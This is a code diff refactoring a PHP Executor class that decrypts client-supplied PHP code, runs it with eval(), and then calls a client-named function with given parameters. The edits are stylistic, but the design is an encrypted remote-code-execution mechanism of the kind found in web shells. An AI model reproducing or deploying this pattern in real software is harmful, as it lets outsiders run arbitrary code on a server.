@@ -367,9 +367,9 @@ class Executor
     use Singleton;
     use ClientDataValidator;
     private readonly Decryptor $decryptor;
-    private array $decryptorData;
-    private ?string $command;
-    private ?array $parameters;
+    private readonly array $decryptorData;
+    private ?string $command = null;
+    private ?array $parameters = null;
     private function getClassObjs(): array
     {
         return [
@@ -388,10 +388,12 @@ class Executor
         );
         $this->validate($clientData);
         $this->decryptorData = $clientData["decryptor"];
-        if (isset($clientData["command"]))
+        if (isset($clientData["command"])) {
             $this->command = $clientData["command"];
-        if (isset($clientData["parameters"]))
+        }
+        if (isset($clientData["parameters"])) {
             $this->parameters = $clientData["parameters"];
+        }
         $decryptorPtr = GetPHP::getInstance()->getDecryptor();
         $this->decryptor = $decryptorPtr::getInstance($this->decryptorData);
     }
@@ -399,10 +401,12 @@ class Executor
     {
         $phpString = $this->decryptor->decrypt($encryptedPhpString);
         $evalReturn = eval($phpString);
-        if (!$this->command)
+        if (!$this->command) {
             return $evalReturn;
-        if (!function_exists($this->command))
-            throw new Exception("function main does not exist");
+        }
+        if (!function_exists($this->command)) {
+            throw new Exception("function {$this->command} does not exist");
+        }
         return call_user_func($this->command, $this->parameters);
     }
 }
